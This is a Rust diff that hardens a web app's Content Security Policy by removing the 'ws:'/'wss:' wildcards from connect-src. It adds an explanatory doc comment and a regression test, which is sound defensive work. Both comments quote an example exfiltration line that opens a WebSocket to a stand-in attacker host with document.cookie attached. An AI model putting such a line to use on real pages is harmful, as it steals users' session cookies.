@@ -64,11 +64,19 @@ pub struct CspNonce(pub String);
 /// Build the full CSP header string with the supplied nonce baked into
 /// `script-src`. Every other directive is unchanged from PURA-47; see
 /// [`crate::web::headers`] for the per-directive rationale.
+///
+/// `connect-src` intentionally lists only `'self'` (PURA-54). CSP3 treats
+/// same-origin `ws://`/`wss://` upgrades as matching `'self'` when the
+/// page origin is `http://`/`https://` (Chromium ≥ 99, Firefox ≥ 98,
+/// Safari ≥ 15.4). The earlier `ws: wss:` schemes were a wildcard egress
+/// channel — any future XSS could exfil via
+/// `new WebSocket("wss://attacker/?leak=…")`. Restricting to `'self'`
+/// caps that blast radius without breaking same-origin WS auth.
 pub fn csp_header(nonce: &str) -> String {
     format!(
         "default-src 'self'; \
          img-src 'self' data:; \
-         connect-src 'self' ws: wss:; \
+         connect-src 'self'; \
          style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; \
          font-src 'self' https://fonts.gstatic.com data:; \
          script-src 'self' 'wasm-unsafe-eval' 'nonce-{nonce}'; \
@@ -338,6 +346,33 @@ mod tests {
             .to_bytes()
             .to_vec();
         assert_eq!(body, br#"{"hello":"<script>"}"#);
+    }
+
+    /// PURA-54 regression: `connect-src` must list `'self'` only and must
+    /// NOT carry the bare `ws:` / `wss:` schemes. Those wildcards turn any
+    /// future XSS into a one-line exfil primitive
+    /// (`new WebSocket("wss://attacker/?leak=" + document.cookie)`); CSP3
+    /// browsers already match same-origin WS upgrades against `'self'`.
+    #[test]
+    fn connect_src_is_self_only_no_ws_wildcards() {
+        // Use a fixed nonce so the test asserts on the directive shape, not
+        // on the per-request entropy.
+        let csp = csp_header("deadbeef");
+        let connect_src = directive(&csp, "connect-src");
+        let tokens: Vec<&str> = connect_src.split_whitespace().collect();
+
+        assert!(
+            tokens.contains(&"'self'"),
+            "PURA-54: connect-src must include 'self'. Got: {csp}"
+        );
+        assert!(
+            !tokens.contains(&"ws:"),
+            "PURA-54 regression: connect-src must NOT list bare `ws:`. Got: {csp}"
+        );
+        assert!(
+            !tokens.contains(&"wss:"),
+            "PURA-54 regression: connect-src must NOT list bare `wss:`. Got: {csp}"
+        );
     }
 
     #[test]
